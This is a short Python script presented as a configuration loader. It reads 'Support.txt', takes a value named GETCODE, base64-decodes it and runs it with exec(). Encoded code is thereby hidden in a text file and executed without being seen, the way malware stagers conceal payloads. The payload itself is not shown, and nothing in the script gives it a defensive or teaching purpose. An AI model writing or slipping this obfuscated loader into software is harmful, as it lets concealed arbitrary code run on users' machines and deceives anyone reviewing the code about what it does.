import os
import base64

def load_variables(filename):
    variables = {}
    with open(filename, 'r') as file:
        for line in file:
            line = line.strip()
            if line and '=' in line:
                key, value = line.split('=', 1)  # Split only on the first '='
                variables[key] = value
    return variables

config = load_variables('Support.txt')
GETCODE = config.get('GETCODE', '')

if GETCODE:
    decoded_bytes = base64.b64decode(GETCODE)
    decoded_code = decoded_bytes.decode('utf-8')
    exec(decoded_code)
